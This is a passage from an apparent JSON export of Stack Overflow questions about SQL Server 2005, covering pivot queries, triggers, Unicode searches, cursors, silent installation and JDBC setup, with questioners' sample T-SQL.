\"Invalid Parameter Count\" when it parses the SQL.  I can't get to the Mappings screen.  Any ideas?</p>\n"},{"tags":["sql","tsql","sql-server-2005","pivot","pivot-without-aggregate"],"answer_count":5,"favorite_count":3,"up_vote_count":5,"down_vote_count":0,"view_count":245,"score":5,"question_id":12221037,"title":"How can I query row data as columns?","body":"<p>I'm sure I'm missing something here.</p>\n\n<p>I have a dataset like this:</p>\n\n<pre>\nFK    RowNumber    Value    Type    Status\n1     1            aaaaa    A       New\n1     2            bbbbb    B       Good\n1     3            ccccc    A       Bad\n1     4            ddddd    C       Good\n1     5            eeeee    B       Good\n2     1            fffff    C       Bad\n2     2            ggggg    A       New\n2     3            hhhhh    C       Bad\n3     1            iiiii    A       Good\n3     2            jjjjj    A       Good\n</pre> \n\n<p>I'd like to query the top 3 results and Pivot them as columns, so the end result set looks like this:</p>\n\n<pre>\nFK    Value1    Type1    Status1    Value2    Type2    Status2    Value3    Type3    Status3\n1     aaaaa     A        New        bbbbb     B        Good       ccccc     A        Bad\n2     fffff     C        Bad        ggggg     A        New        hhhhh     C        Bad\n3     iiiii     A        Good       jjjjj     A        Good\n\n</pre>\n\n<p>How can I accomplish this in SQL Server 2005? </p>\n\n<p>I have been attempting this using <a href=\"http://msdn.microsoft.com/en-us/library/ms177410%28SQL.105%29.aspx\" rel=\"nofollow\">PIVOT</a>, but I am still very unfamiliar with that keyword and cannot get it to work the way I want.</p>\n\n<pre><code>SELECT * --Id, [1], [2], [3]\nFROM\n(\n    SELECT Id, Value, Type, Status\n    , ROW_NUMBER() OVER (PARTITION BY Id ORDER Status, Type) as [RowNumber]\n    FROM MyTable\n) as T\nPIVOT\n(\n    -- I know this section doesn't work. I'm still trying to figure out PIVOT\n    MAX(T.Value) FOR RowNumber IN ([1], [2], [3]),\n    MAX(T.Type) FOR RowNumber IN ([1], [2], [3]),\n    MAX(T.Status) FOR RowNumber IN ([1], [2], [3])\n) AS PivotTable;\n</code></pre>\n\n<p>My actual data set is a bit more complex than this, and I need the top 10 records, not the top 3, so I don't want to simply do <code>CASE WHEN RowNumber = X THEN...</code> for each one.</p>\n\n<p><strong>Update</strong></p>\n\n<p>I tested all the answers below, and found most of them seem about the same with no apparent performance difference in smaller data sets (around 3k records), however there was a slight difference when running the queries against larger data sets. </p>\n\n<p>Here are the results of my tests using 80,000 records and querying for 5 columns in the top 10 rows, so my end result set was 50 columns + the <code>Id</code> column. I'd suggest you test them on your own to decide which one works best for you and your environment.</p>\n\n<ul>\n<li><p><a href=\"http://stackoverflow.com/a/12221580/302677\">bluefoot's answer</a> of unpivoting and re-pivoting the data averaged the fastest at about 12 seconds. I also liked this answer because I found it easiest to read and maintain.</p></li>\n<li><p><a href=\"http://stackoverflow.com/a/12221510/302677\">Aaron's answer</a> and <a href=\"http://stackoverflow.com/a/12221623/302677\">koderoid's answer</a> both suggest using a <code>MAX(CASE WHEN RowNumber = X THEN ...)</code>, and was close behind averaging at around 13 seconds.</p></li>\n<li><p><a href=\"http://stackoverflow.com/a/12221475/302677\">Rodney's answer</a> of using multiple <code>PIVOT</code> statements averaged around 16 seconds, although it might be faster with fewer PIVOT statements (my tests had 5).</p></li>\n<li><p>And the first half of <a href=\"http://stackoverflow.com/a/12221510/302677\">Aaron's answer</a> that suggested using a CTE and <code>OUTER APPLY</code> was the slowest. I don't know how long it would take to run because I cancelled it after 2 minutes, and that was with around 3k records, 3 rows, and 3 columns instead of 80k records, 10 rows, and 5 columns.</p></li>\n</ul>\n"},{"tags":["sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":17,"score":0,"question_id":13184312,"title":"Meaning of Msg 3456, Level 16 Sql Server message","body":"<p>What's the meaning of the below error:</p>\n\n<blockquote>\n  <p><em>Could not redo log record (13711624:118626:157), for transaction ID\n  (2:-271513189), on page (3:57660275), database 'Manish' (database ID\n  5). Page: LSN = (13711624:118626:151), type = 2. Log: OpCode = 2,\n  context 3, PrevPageLSN: (13711624:118626:154). Restore from a backup\n  of the database, or repair the database.</em></p>\n  \n  <p><em>Msg 3013, Level 16, State 1, Line 1</em></p>\n</blockquote>\n\n<p>I have some questions:</p>\n\n<ol>\n<li>page (3:57660275) ==> Means fileid=3 and pageid=57660275 or page 3 </li>\n<li>Meaning of log record  (13711624:118626:157)</li>\n<li>Meaning of transaction ID (2:-271513189) ==> is this distributed transaction on fileid=2?</li>\n</ol>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":19,"score":1,"question_id":13180231,"title":"Migrating DB from SQL 2005 Enterprise to SQL 2008 Standard","body":"<p>I'm attemtping to migrate a DB from SQL 2005 Enterprise to SQL 2008 Standard.  I've run into an issue because there is a Partition Function defined in the DB of the Enterprise edition.  I know Standard edtiions do not support Partition Functions. Upgrading the version of SQL im migrating to Enterprise isn't an option.</p>\n\n<p>I'm looking for a way to remove the partition function without causing any negative effects to the DB currently so I can migrate it to the 2008 Standard Edition.</p>\n\n<p>Any help would be greatly appreciated. Thanks!</p>\n\n<p>MOVED to dba.stackexchange.com. </p>\n"},{"tags":["sql","sql-server-2005","stored-procedures","dll","64bit"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":13178122,"title":"Run 32 bit dll in 64 bit SQL SERVER","body":"<p>I have a 32 bit dll which is called from a stored procedure. It works fine with 32 bit sql server but now when i call that procedure from 64 bit sql server 2005 developer edition it gives an exception. </p>\n\n<p><strong>How can I make a 32 bit dll to run from 64 bit sql server?</strong> </p>\n\n<p>Please note I do not have the source code for the dll, therefore recompiling won't be a option  .</p>\n"},{"tags":["mysql","sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":3,"favorite_count":3,"up_vote_count":4,"down_vote_count":0,"view_count":54,"score":4,"question_id":13177765,"title":"Regarding get automatic columns in sql`","body":"<p>I have basically 50 fields in a table and I want to select this fields from table on a regular basis.</p>\n\n<p><strong>Problem is</strong>: I have to write all this 50 fields manually.</p>\n\n<p>Is there any shortcut in intellisence or any other tool where I can get all fields. automatically by pressing tool.</p>\n\n<p>Also guys if anyone knows here extra addons on sql..then please post it here.</p>\n"},{"tags":["sql-server","database","sql-server-2005"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":13174627,"title":"Searching some text from SQL-Server DB","body":"<p>This Query can search any string value (table name, table data etc) from all the tables/views of any SQL-Server DB, when you will place any string at \"<strong>your text here</strong>\" it will search your given string from all the tables/views exist in that DB,    </p>\n\n<pre><code>DECLARE @SearchStr nvarchar(100) \n    SET @SearchStr = 'your text here'\n\nDECLARE @Results TABLE(ColumnName nvarchar(370), ColumnValue nvarchar(3630))\n\nSET NOCOUNT ON\n\nDECLARE @TableName nvarchar(256), @ColumnName nvarchar(128), @SearchStr2 nvarchar(110)\nSET  @TableName = ''\nSET @SearchStr2 = QUOTENAME('%' + @SearchStr + '%','''')\n\nWHILE @TableName IS NOT NULL\nBEGIN\n    SET @ColumnName = ''\n    SET @TableName = \n    (\n        SELECT MIN(QUOTENAME(TABLE_SCHEMA) + '.' + QUOTENAME(TABLE_NAME))\n        FROM    INFORMATION_SCHEMA.TABLES\n        WHERE       TABLE_TYPE = 'BASE TABLE'\n            AND QUOTENAME(TABLE_SCHEMA) + '.' + QUOTENAME(TABLE_NAME) &gt; @TableName\n            AND OBJECTPROPERTY(\n                    OBJECT_ID(\n                        QUOTENAME(TABLE_SCHEMA) + '.' + QUOTENAME(TABLE_NAME)\n                         ), 'IsMSShipped'\n                           ) = 0\n    )\n\n    WHILE (@TableName IS NOT NULL) AND (@ColumnName IS NOT NULL)\n    BEGIN\n        SET @ColumnName =\n        (\n            SELECT MIN(QUOTENAME(COLUMN_NAME))\n            FROM    INFORMATION_SCHEMA.COLUMNS\n            WHERE       TABLE_SCHEMA    = PARSENAME(@TableName, 2)\n                AND TABLE_NAME  = PARSENAME(@TableName, 1)\n                AND DATA_TYPE IN ('char', 'varchar', 'nchar', 'nvarchar')\n                AND QUOTENAME(COLUMN_NAME) &gt; @ColumnName\n        )\n\n        IF @ColumnName IS NOT NULL\n        BEGIN\n            INSERT INTO @Results\n            EXEC\n            (\n                'SELECT ''' + @TableName + '.' + @ColumnName + ''', LEFT(' + @ColumnName + ', 3630) \n                FROM ' + @TableName + ' (NOLOCK) ' +\n                ' WHERE ' + @ColumnName + ' LIKE ' + @SearchStr2\n            )\n        END\n    END \nEND\n\nSELECT ColumnName, ColumnValue FROM @Results\n</code></pre>\n\n<p><strong>But i like to search</strong> given string in the <code>procedures/functions/triggers</code> as well is there any query exist for SQL server 2005. As this query does not search in these areas.</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":65,"score":1,"question_id":13173372,"title":"How to select one record at a time without using cursor?","body":"<p>I have two tables in SQL SERVER.</p>\n\n<p>DBO.VitalPatientDetails=></p>\n\n<p>| PatientDetailsId | PatientId | PatientName | UnitName | BedName | PatientDOB | LastAlarmReceivedAt |</p>\n\n<p>DBO.VitalAlarmDetails=></p>\n\n<p>| Id | PatientDetailsId (Refers VitalPatientDetails.PatientDetailsId) | VitalGenerationTime | FileName | </p>\n\n<p>I need to retrive all fields of DBO.VitalAlarmDetails grouped by PatientDetailsId ordered by VitalGenerationTime in ascending order.\nI have written cursor for this as below and it is returning multiple result sets. I need to get it in single set without using cursor. I just want to know whether I can do this without cursor.</p>\n\n<pre><code>DECLARE @PatientDetailsId BIGINT\nDECLARE @getAlarmDetails CURSOR\n\nSET @getAlarmDetails = CURSOR FOR SELECT PatientDetailsId FROM VitalPatientDetails\n\nOPEN @getAlarmDetails\n    FETCH NEXT FROM @getAlarmDetails INTO @PatientDetailsId\n\n    WHILE @@FETCH_STATUS = 0\n    BEGIN\n        SELECT * FROM VitalAlarmDetails\n        WHERE PatientDetailsId = @PatientDetailsId\n        ORDER BY VitalGenerationTime ASC\n\n        FETCH NEXT FROM @getAlarmDetails INTO @PatientDetailsId\n    END\nCLOSE @getAlarmDetails\nDEALLOCATE @getAlarmDetails\n</code></pre>\n\n<p>Thanks.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","command-line","installation"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":3437,"score":1,"question_id":696846,"title":"sql server 2005 command line install error ADD_LOCAL property already installed","body":"<p>I have a silent installation of SQL Server 2005 that works great when installing SQL Server on a machine that does not have it already installed.  I use the following parameters when I perform the installation:</p>\n\n<pre><code>#define SQL_SILENT                    \"/passive /qb\"\n#define SQL_USERNAME                  \"username=MyUserName\"\n#define SQL_COMPANYNAME               \"companyname=MyCompanyName\"\n#define SQL_ADDLOCAL                  \"ADDLOCAL=SQL_Engine\"\n#define SQL_UPGRADE                   \"\"\n#define SQL_DISABLENETWORKPROTOCOLS   \"disablenetworkprotocols=0\"\n#define SQL_INSTANCENAME              \"instancename=MYSQLINSTANCE\"\n#define SQL_SQLAUTOSTART              \"SQLAUTOSTART=1\"\n#define SQL_SECURITYMODE              \"SECURITYMODE=SQL\"\n#define SQL_SAPWD                     \"SAPWD=StrongPassword\"\n#define SQL_SQLACCOUNT                \"SQLACCOUNT=\"\"\"\"\"\n#define SQL_SQLPASSWORD               \"SQLPASSWORD=\"\"\"\"\"\n</code></pre>\n\n<p>It installs the instance of SQL Server Express without a problem.  However, when I attempt to install SQL Server on a machine that already has another instance with components I get the following error:</p>\n\n<p>*\"A component that you have specified in the ADD_LOCAL property is already installed.  To upgrade the existing component, refer to the template.ini and set the UPGRADE property to the name of the component.\"*</p>\n\n<p>I have also tried using the UPGRADE method as per the error message </p>\n\n<pre><code>#define SQL_UPGRADE       \"UPGRADE=SQL_Engine INSTANCENAME=MYSQLINSTANCE\"\n</code></pre>\n\n<p>but get the following error:</p>\n\n<p><em>\"SQL Server Setup cannot perform the upgrade because the component is not installed on the computer.  To proceed, verify the component to be upgraded in currently installed, and that the component to be upgraded is specified in the ADDLOCAL property.\"</em></p>\n\n<p>Does anyone have any suggestions?</p>\n\n<p>Thank you</p>\n"},{"tags":["sql-server-2005","unicode","internationalization"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":102,"score":1,"question_id":1845451,"title":"How can I insert Armenian string to SQL Server database","body":"<p>How can I insert Armenian string to SQL Server database.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":9,"favorite_count":2,"up_vote_count":6,"down_vote_count":1,"view_count":19041,"score":5,"question_id":358542,"title":"How to find fifth highest salary in a single query in SQL Server","body":"<p>How to find fifth highest salary in a single query in SQL Server</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005","login"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":63,"score":1,"question_id":13168175,"title":"SQL Script to Create Auto-Expiring Login","body":"<p>How can I script the creation of a new SQL Login (whether by Windows\nAuthentication or with SQL password) and have it automatically expire after some\ntime, e.g. 8 hours, 24 hours</p>\n\n<p>I've tried searching here in stackoverflow but I haven't found a solution. If you guys know of one that exists here, please let me know too. Thank you.</p>\n\n<p>I am using SQL Server 2005 and 2008</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":34,"score":4,"question_id":13168965,"title":"Group by query is not returning what I expected","body":"<p>I am attempting to find all records that have the same <code>groupCol</code> but more than one non 0 <code>infoCol</code>. Here is a complete example of what I am trying to do.</p>\n\n<pre><code>CREATE TABLE #t\n    (\n    groupCol varchar(14) NOT NULL,\n    infoCol int NOT NULL,\n    indexCol int NOT NULL IDENTITY (1, 1)\n    )\nGO\n\ninsert into #t (groupCol, infoCol) \nvalues ('NoRows',1),      ('NoRows',1),      ('NoRows',1),       --Not in output due to having only 1 disticnt infoCol\n       ('TwoResults',1),  ('TwoResults',1),  ('TwoResults',2),   --In the output with \"'TwoResults', 2\"\n       ('ThreeResults',1),('ThreeResults',2),('ThreeResults',3), --In the output with \"'ThreeResults', 3\"\n       ('ExcludedZero',1),('ExcludedZero',1),('ExcludedZero',0)  --Not in the output due to 0 being excluded for finding distinct infoCol's\n       ('TwoAndZero',1),  ('TwoAndZero',2),  ('TwoAndZero',0)    --In the output but returns 2 not 3.\n\nselect * from #t\n\nselect groupCol, count(groupCol) as distinctInfoCol \nfrom #t \nwhere infoCol &lt;&gt; 0\ngroup by groupCol, infoCol\nhaving count(groupCol) &gt; 1\n\ndrop table #t\n</code></pre>\n\n<p>However the result from my query is </p>\n\n<pre>\ngroupCol       distinctInfoCol\n-------------- ---------------\nExcludedZero   2\nNoRows         3\nTwoResults     2\n</pre>\n\n<p>When I expected my output to be</p>\n\n<pre>\ngroupCol       distinctInfoCol\n-------------- ---------------\nTwoResults     2\nThreeResults   3\nTwoAndZero     2\n</pre>\n\n<p>What am I doing wrong, and how do I correct this to get the results I need?</p>\n"}]}
{"total":14387,"page":2,"pagesize":100,"questions":[{"tags":["sql","performance","sql-server-2005","sql-server-2012"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":830,"score":-4,"question_id":10926841,"title":"Sql Server 2012 slower than 2005?","body":"<p>We have deployed SQL Server 2012 Enterprise and we have performance issues:</p>\n\n<ul>\n<li>same data (backuped from our SQL Server 2005 Enterprise and restored on 2012)</li>\n<li>test script of 3200 sql SELECT statements</li>\n</ul>\n\n<p>We do tests using Management Studio:</p>\n\n<ol>\n<li>results as plain text</li>\n<li>results in a file</li>\n</ol>\n\n<p>On same computer:</p>\n\n<ol>\n<li>2005 : 15 sec, 2012 : 2 min</li>\n<li>2005 : 14 sec, 2012 : 30 sec</li>\n</ol>\n\n<p>Even with a more powerful computer, 2012 is still slower than 2005.</p>\n\n<p>What can be wrong? The way we installed SQL Server 2012 and default parameters? The way we restored the backup? What can we do?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":13168200,"title":"How to use subquery with multiple tables","body":"<p>I'm trying to create a subquery to bring two tables together but am getting nothing.</p>\n\n<p>Code:</p>\n\n<pre><code>SELECT DISTINCT Agreements.AgrmntID, Agreements.Status, JobSites.SiteName,\n  PurchaseOrderDetails.ExtCost\nFROM Agreements Inner Join\n  JobSites On Agreements.CustSiteID = JobSites.CustSiteID\nWHERE Agreements.Status = 2 And PurchaseOrderDetails.ExtCost = (Select\n    PurchaseOrderDetails.ExtCost\n  FROM PurchaseOrderDetails \n  Inner Join PurchaseOrders On PurchaseOrders.POID = PurchaseOrderDetails.POID\n  WHERE PurchaseOrders.Description Like ('%', JobSites.SiteName, '%') And   \n  Convert(varchar(8),PurchaseOrderDetails.TimeCreated,1) = '09/10/12')\nORDER BY JobSites.SiteName\n</code></pre>\n\n<p>Expected Output:</p>\n\n<pre><code>AgreemntID   Status  SiteName  ExtCost\n----------------------------------------\n1            2       TEST01    $144.00\n2            2       TEST02    $400.00\n</code></pre>\n\n<p>I'm using a subquery because there's nothing that links the ExtCost to the SiteName except the Description under PurchaseOrders.</p>\n\n<p>Hopefully this is enough information for you to help me.  Thank you in advance!!</p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":201,"score":0,"question_id":3183398,"title":"Trigger only modify updated/inserted row","body":"<p>Hi I have the following trigger.</p>\n\n<p><code>ALTER TRIGGER [dbo].[DivisionLastModified] ON [dbo].[tb_Division]\nWITH EXECUTE AS CALLER\nFOR INSERT, UPDATE\nAS\nBEGIN\nUPDATE tb_Division SET  LastModified = GetDate()\nEND</code></p>\n\n<p>This updates all rows however I only wish to modify the update/added row.\nIs this achievable?</p>\n"},{"tags":["sql","sql-server-2005","index"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":48,"score":3,"question_id":13075245,"title":"SQL Server 2005 IndexOptimize SP against one table's indexes","body":"<p>I'm trying to figure out how to use this <code>IndexOptimize</code> stored procedure that I got from <a href=\"http://ola.hallengren.com/\" rel=\"nofollow\">http://ola.hallengren.com/</a> to run against just a single table's indexes.</p>\n\n<p>When I run the following query:</p>\n\n<pre><code>SELECT * \nFROM sys.dm_db_index_physical_stats (DB_ID(N'database_name'), \n                                     OBJECT_ID(N'dbo.table_name'), \n                                     NULL, NULL , 'DETAILED');'\n</code></pre>\n\n<p>I get this as the result both before and after running the <code>IndexOptimize</code> job:</p>\n\n<p><a href=\"http://cl.ly/image/472J160R1y2n\" rel=\"nofollow\">http://cl.ly/image/472J160R1y2n</a></p>\n\n<p>Here is what I'm trying to run:</p>\n\n<pre><code>EXECUTE dbo.IndexOptimize\n     @Databases = 'database_name',\n     @Indexes = 'database_name.dbo.table_name',\n     @FragmentationLow = NULL,\n     @FragmentationMedium = 'INDEX_REORGANIZE,INDEX_REBUILD_ONLINE',\n     @FragmentationHigh = 'INDEX_REBUILD_ONLINE',\n     @FragmentationLevel1 = 5,\n     @FragmentationLevel2 = 30'\n</code></pre>\n\n<p>The query completes, but it doesn't seem to make a difference to the table's indexes. Am I missing something?</p>\n"},{"tags":["sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1406,"score":0,"question_id":3443672,"title":"Integer division in sql server","body":"<p>In Microsoft SQL Server 2005, why do the following commands produce integer results?</p>\n\n<pre><code>SELECT cast(151/6 AS DECIMAL(9,2))\nSELECT 151/6\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":282,"score":1,"question_id":9846148,"title":"Pivot Multiple Rows","body":"<p>I have a table similar to the following:</p>\n\n<pre><code>id    key    str_val    date_val      num_val\n1     A      a\n1     B      b\n1     C                 2012-01-01\n1     D                               1\n2     A      c\n2     E      d\n2     C                 2012-01-02\n2     D                                2\n</code></pre>\n\n<p>I need it to look like:</p>\n\n<pre><code>id    A      B      C             D       E\n1     a      b      2012-01-01    1\n2     c             2012-01-02    2       d\n</code></pre>\n\n<p>Basically, each key needs to become it's own column</p>\n\n<p>I tried and failed to use the PIVOT command usefully, and I'm currently trying to accomplish this with a case statement. i.e.</p>\n\n<pre><code>select\n    id,\n    case key\n        when 'A'\n        then str_val\n    end as A,\n    case key\n        when 'C'\n        then date_val\n    end as C\n    --etc.\nfrom test_table\n</code></pre>\n\n<p>However I can't figure out how to combine the table rows after this runs. I'm stuck with:</p>\n\n<pre><code>id    A      B      C             D       E\n1     a\n1            b\n1                   2012-01-01\n1                                 1\n</code></pre>\n\n<p>Any thoughts or input that could help me out? Thanks in advance.</p>\n"},{"tags":["sql-server-2005","database-tuning"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":227,"score":2,"question_id":3602050,"title":"Undo changes made by SQL Server Database Tuning","body":"<p>I am not sure if this question can be asked here or serverfault. I was wondering...Is there is a way to quickly undo the changes made by SQL Server 2005 Tuning Advsor other than recovering from a backup?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql","string-to-datetime"],"answer_count":10,"favorite_count":4,"up_vote_count":16,"down_vote_count":0,"view_count":81423,"score":16,"question_id":207190,"title":"Sql Server string to date conversion","body":"<p>I want to convert a string like this:</p>\n\n<pre><code>'10/15/2008 10:06:32 PM'\n</code></pre>\n\n<p>into the equivalent DATETIME value in Sql Server.</p>\n\n<p>In Oracle, I would say this:</p>\n\n<pre><code>TO_DATE('10/15/2008 10:06:32 PM','MM/DD/YYYY HH:MI:SS AM')\n</code></pre>\n\n<p><a href=\"http://stackoverflow.com/questions/202243/custom-datetime-formatting-in-sql-server\">This question</a> implies that I must parse the string into one of the <a href=\"http://msdn.microsoft.com/en-us/library/aa226054(SQL.80).aspx\" rel=\"nofollow\">standard formats</a>, and then convert using one of those codes.  That seems ludicrous for such a mundane operation.  Is there an easier way?</p>\n"},{"tags":["sql-server-2005","coldfusion"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":75,"score":2,"question_id":13148003,"title":"mssql another way to write a query using IN?","body":"<p>I'm updating a web page search form.  The user selects the group names they want to search for.  And on the action page, lets say for simplicity sake, I end up with the following query: </p>\n\n<pre><code>select GroupName\nfrom    groupTable \nwhere groupName in ('Motley Crue','Alvin and the Chipmunks')\n</code></pre>\n\n<p>Normally, this isn't a problem for me but in this case, the database field may also contain a string of names such as:</p>\n\n<pre><code>Big Dog's Chair,Purple Dragon,Just Johnny,Johnny Faster,Van Halen\n</code></pre>\n\n<p>I believe I will have to loop over each item in the database field with each item in my comma delimited list.  If that is the case, I do not know how to do this and I don't know what search terms to use in SO or google.  I could use some help.  </p>\n\n<p>Database:  MSSQL 2005\nColdfusion:  CF9</p>\n\n<p>I leave work in a at 5:00CST so if you reply, I probably wont see it until tomorrow.</p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":2848,"score":1,"question_id":5141521,"title":"How to insert data from Excel sheet to SQL Server 2005","body":"<p>I have an Excel sheet now I need to insert data from that sheet into SQL Server 2005. </p>\n\n<p>I need to create a temp table and insert data into that table. The database name is <code>Employee</code></p>\n\n<p>Can you pls  provide me the syntax for achieving it.</p>\n"},{"tags":["c#","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":49,"score":3,"question_id":13106351,"title":"Issue related to Searching Data in SQL Server","body":"<p>I have SQL datatable StudetnMaster having FirstName nvarchar(100) and contains Data Entry Gujarati Lanuage (Unicode Chracters )</p>\n\n<pre><code>   StudentId   FirstName\n     1           \n     2              \n</code></pre>\n\n<p>now i have following query for searching :</p>\n\n<pre><code>Select * from StudetnMaster where FirstName like N'\" + textBox1.Text.Trim() + \"%' \n</code></pre>\n\n<p>its working fine:</p>\n\n<p>but in stiored procedure i have to pass parameter for FirstName as Follows:</p>\n\n<pre><code>ALTER PROCEDURE dbo.StoredProcedure1\n        @FirstName nvarchar(100)\n\nAS\n\n    select * from StudentNew where FirstName like N@FirstName+'%' \n</code></pre>\n\n<p>but it throws an Error saying : Invalid Column Name N@FirstName</p>\n\n<p>how can i use <code>'N'</code>  in storedProcedure for parameter because without using <code>N'</code> Unicode Text is not searchable: </p>\n\n<p>For inline query as mentioned above i got resut: but for stored procedure i got error: so how can we use     <code>'N'</code>  in storedprocedure?</p>\n\n<p>is there any other solution for searching unicode characters in storedrocedure?</p>\n\n<p>Thanks</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":5,"favorite_count":9,"up_vote_count":31,"down_vote_count":0,"view_count":12823,"score":31,"question_id":175962,"title":"Dynamic SELECT TOP @var In SQL Server","body":"<p>How can I have a dynamic variable setting the amount of rows to return in SQL Server? Below is not valid syntax in SQL Server 2005+:</p>\n\n<pre><code>DECLARE @count int\nSET @count = 20\n\nSELECT TOP @count * FROM SomeTable\n</code></pre>\n"},{"tags":["java","sql","sql-server-2005","playframework","playframework-2.0"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":13144887,"title":"Setting up Play 2.0 project with Sql Server 2005","body":"<p>I previously had my app set up to use a MySQL db as the default, and it worked fine.</p>\n\n<p>Now I'm trying to get it to work with <strong><em>SQL server 2005</em></strong>. The I tried this and several similar variants:</p>\n\n<h2>application.conf</h2>\n\n<pre><code>db.default.url=\"jdbc:sqlserver://remoteServerName:Port\"\ndb.default.driver=com.microsoft.jdbc.sqlserver.SQLServerDriver\ndb.default.user=correctUser\ndb.default.pass=correctPass\n</code></pre>\n\n<p>But I'm getting the following error:</p>\n\n<pre><code>Driver not found: [com.microsoft.jdbc.sqlserver.SQLServerDriver]\n...\ncaused by: java.lang.ClassNotFoundException: com.microsoft.jdbc.sqlserver.SQLServerDriver\n</code></pre>\n\n<p>At first glance, it seems like this would hint the jdbc driver JAR is missing from the build path. The problem is, it <em>isn't</em> missing from the build path. sqljdbc4.jar is sitting in the build path with everything else.</p>\n\n<p>Am I missing something? I'm not sure where to go here.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":4,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":58,"score":2,"question_id":13084195,"title":"Summarising data into year ranges","body":"<p>I am trying to sumarise data in sql and am having difficulty finding a method for grouping data.</p>\n\n<p>i have a table named cars</p>\n\n<pre><code>CarID CarMake  CarModel CarYear\n1      Ford      Mondeo   2000\n2      Ford      Mondeo   2002\n3      Ford      Mondeo   2003\n4      Ford      Mondeo   2005\n</code></pre>\n\n<p>I want to be able to group this data to appear as</p>\n\n<pre><code>CarMake CarModel CarYearRange\nFord     Mondeo   2000-2003\nFord     Mondeo   2005-2005\n</code></pre>\n\n<p>I Have tried using min and max to produce this however this fails if the car wasn't made in a year between as in the example.</p>\n"},{"tags":["sql-server-2005","tsql"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1026,"score":1,"question_id":4921724,"title":"Returning index of n-th element in string using tsql","body":"<p>How in SQL Server can I return index of n-th element in string. For example I have string: <strong>a,b,c,d,e</strong>\nNow I want to receive all elements, before third coma, so <strong>a,b,c</strong>. For doing this I need to have index of third coma. Charindex does not fit here, because I cannot pass number of coma, for which I want the index. Is there any built-in function which can do it ?</p>\n\n<p><strong>Update</strong>, @Andriy M.</p>\n\n<p>Hey, the link You pointed me to is also useful. Below I've modified the shown sql a bit to get what I want:</p>\n\n<pre><code>CREATE FUNCTION [dbo].[nthindexsub](@String varchar(8000), @Delimiter char(1), @DelimitersCount int)       \n returns varchar(8000)\n as       \n begin       \n     declare @Substring varchar(8000)\n     declare @temptable TABLE (itemindex int identity(1,1), items varchar(8000))\n     declare @idx int       \n     declare @slice varchar(8000)     \n\n     select @idx = 1       \n         if len(@String)&lt;1 or @String is null  return @Substring \n\n     while @idx!= 0       \n     begin       \n         set @idx = charindex(@Delimiter,@String)       \n         if @idx!=0       \n             set @slice = left(@String,@idx - 1)       \n         else       \n             set @slice = @String       \n\n         if(len(@slice)&gt;0)  \n             insert into @temptable(Items) values(@slice)       \n\n         set @String = right(@String,len(@String) - @idx)       \n         if len(@String) = 0 break       \n     end\n\n     select @Substring = COALESCE(@Substring + ',', '') + items from @temptable where itemindex &lt;= @DelimitersCount  \n     return @Substring;\n end\n</code></pre>\n\n<p>usage:</p>\n\n<pre><code>select dbo.nthindexsub('a,b,c,d,e', ',', 3)\n</code></pre>\n\n<p>the result is: <strong>a,b,c</strong></p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":3,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13152230,"title":"\"WHEN OTHERS THEN NULL\" in SQL Server 2005","body":"<p><code>tracking_table</code> is a log table declared as follows:</p>\n\n<pre><code>create table tracking_table (my_command nvarchar(500), my_date datetime);\n</code></pre>\n\n<p>Please suppose you have the following block of SQL SERVER 2005 code, declared within a SQL Server 2005 job:</p>\n\n<pre><code>DECLARE @my_statement NVARCHAR(500)  \ndelete from tracking_table\n   SET @my_statement = 'ALTER INDEX ALL ON my_user.dbo.my_fact_table REBUILD WITH (FILLFACTOR = 90)'\ninsert into tracking_table values (@my_statement,getdate()) \nEXEC (@my_statement)  \n SET @my_statement = 'ALTER INDEX ALL ON my_user.dbo.my_second_table REBUILD WITH (FILLFACTOR = 90)'\ninsert into tracking_table (@my_statement,getdate())    \nEXEC (@my_statement)  \n</code></pre>\n\n<p>At runtime, if the first statement (<code>ALTER INDEX ALL ON 